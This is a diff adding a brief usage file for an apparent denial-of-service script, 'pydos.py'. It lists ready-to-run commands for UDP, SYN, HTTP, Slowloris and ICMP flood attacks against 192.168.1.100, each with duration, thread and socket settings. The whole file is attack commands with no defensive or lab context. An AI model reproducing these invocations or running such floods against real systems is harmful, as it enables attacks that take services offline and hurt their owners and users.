@@ -1,0 +1,14 @@
+UDP
+python3 pydos.py -m udp -t 192.168.1.100 -p 53 -d 60 -T 200
+
+SYN
+sudo python3 pydos.py -m syn -t 192.168.1.100 -p 80 -d 30 -T 50
+
+HTTP
+python3 pydos.py -m http -t 192.168.1.100 -p 8080 -d 60 -T 300 --path /api/search
+
+Slowloris
+python3 pydos.py -m slowloris -t 192.168.1.100 -p 80 -d 120 --sockets 200
+
+ICMP
+sudo python3 pydos.py -m icmp -t 192.168.1.100 -d 30 -T 20
